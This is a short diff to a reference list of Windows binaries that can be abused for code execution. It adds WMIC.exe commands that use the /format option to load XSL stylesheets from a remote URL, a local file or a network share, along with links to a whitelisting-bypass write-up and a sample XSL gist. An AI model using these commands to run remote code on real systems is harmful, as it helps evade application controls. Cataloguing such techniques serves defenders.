@@ -515,6 +515,9 @@ Notes:
 ## 30. WMIC.exe
 
 `wmic process call create calc`
+`wmic process get brief /format:"https://www.example.com/file.xsl`
+`wmic os get /format:"MYXSLFILE.xsl"`
+`wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"`
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -524,8 +527,8 @@ Notes:
 
 * Links:
   * https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
-   
-   
+  * https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html   
+  * https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl   
    
 ## 31. MavInject32.exe
 
